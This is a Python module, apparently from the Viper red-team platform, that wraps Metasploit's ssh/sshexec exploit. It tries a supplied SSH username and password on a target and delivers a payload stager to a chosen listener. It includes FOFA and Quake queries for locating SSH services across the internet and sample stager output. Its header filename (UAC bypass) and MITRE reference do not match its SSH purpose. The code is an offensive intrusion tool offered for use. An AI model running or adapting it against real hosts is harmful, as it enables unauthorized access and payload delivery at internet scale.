# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(BotMSFModule):
    NAME = "SSH暴力破解模块(beta)"
    DESC = "模块使用内置字典或用户自定义字典对指定地址进行暴力破解攻击.\n" \
           "(模块主要用于测试全网扫描功能)"
    MODULETYPE = TAG2CH.Bot_MSF_Exp
    README = ["https://www.yuque.com/vipersec/module/wgviok"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1193/"]
    AUTHOR = "Viper"
    SEARCH = {
        "FOFA": 'protocol="SSH"',
        "Quake": 'service:"SSH"',
    }
    OPTIONS = register_options([
        OptionStr(name='Username', name_tag="用户名", required=True, desc="暴力破解用户名"),
        OptionStr(name='Password', name_tag="密码", required=True, desc="暴力破解密码"),
        OptionHander(),
    ])

    def __init__(self, ip, port, protocol, custom_param):
        super().__init__(ip, port, protocol, custom_param)
        self.type = "exploit"
        self.mname = "multi/ssh/sshexec"

    def check(self):
        """执行前的检查函数"""
        # check函数中不要执行耗时操作
        result = self.set_payload_by_handler()
        if result is not True:
            return False, "无法解析Handler,请选择正确的监听"  # check失败,返回提示
        else:
            Username = self.param("Username")
            Password = self.param("Password")
            self.set_msf_option("USERNAME", Username)  # 设置exploit/multi/ssh/sshexec模块的USERNAME参数
            self.set_msf_option("PASSWORD", Password)
            self.set_msf_option("RHOSTS", self._ip)
            self.set_msf_option("RPORT", self._port)
            return True, ""

    def callback(self, module_output):
        """调用父类函数存储结果(必须调用)"""
        # module_output 是msf模块运行的结果输出
        # 例如成功时:
        # """[*] 192.168.146.130:22 - Sending stager...
        # [*] Command Stager progress -  44.15% done (362/820 bytes)
        # [!] Timed out while waiting for command to return
        # [*] Command Stager progress - 100.00% done (820/820 bytes)
        # """
        # 失败时:
        # """[-] Exploit aborted due to failure: unreachable: Disconnected during negotiation
        # """
        if "[*] Command Stager progress - 100.00% done" in module_output:
            self.log_good("模块执行成功")
            return True  # 存储callback中的输出,结果显示在主界面模块输出中
        else:
            self.log_error("模块执行失败")
            return False  # 不存储callback中的输出,以免主界面出现大量无意义的结果
